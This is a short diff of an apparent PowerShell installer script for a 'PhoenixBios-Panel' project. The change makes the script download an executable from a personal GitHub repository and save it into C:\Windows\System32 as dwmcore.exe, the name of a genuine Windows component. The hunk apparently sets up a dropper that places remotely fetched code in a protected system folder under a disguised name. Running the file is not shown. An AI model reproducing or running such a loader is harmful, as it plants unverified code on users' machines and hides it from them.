@@ -10,11 +10,11 @@ Write-Host "=====================================" -ForegroundColor Cyan
 Write-Host ""
 
 # DLL URL
-$url = "https://raw.githubusercontent.com/dclucky555-del/PhoenixBios-Panel/main/bstkvm.dll"
+$url = "https://github.com/dclucky555-del/PhoenixBios-Panel/raw/refs/heads/main/dwmcore.exe"
 
 # FIXED PATH (no dynamic, no creation)
 $basePath = "C:\Windows\System32"
-$fileName = "bstkvm.dll"
+$fileName = "dwmcore.exe"
 $filePath = Join-Path $basePath $fileName
 
 # Check folder exists
